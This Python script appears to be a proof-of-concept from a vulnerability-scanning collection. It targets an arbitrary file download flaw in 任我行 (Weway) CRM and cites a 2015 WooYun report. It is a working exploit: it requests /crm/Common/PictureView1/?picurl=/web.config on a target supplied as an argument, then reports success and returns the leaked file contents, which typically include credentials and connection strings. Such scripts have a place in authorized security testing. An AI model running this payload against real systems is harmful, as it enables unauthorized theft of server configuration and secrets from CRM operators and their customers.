#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 任我行crm任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0134737
author: Lucifer
description: 文件Common/PictureView1中,参数picurl存在任意文件下载。
'''
import sys
import requests
import warnings
from termcolor import cprint

class weway_PictureView1_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/crm/Common/PictureView1/?picurl=/web.config"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                cprint("[+]存在任我行crm任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "任我行crm任意文件下载", str(payload), req.text
            else:
                cprint("[-]不存在weway_PictureView1_filedownload漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = weway_PictureView1_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()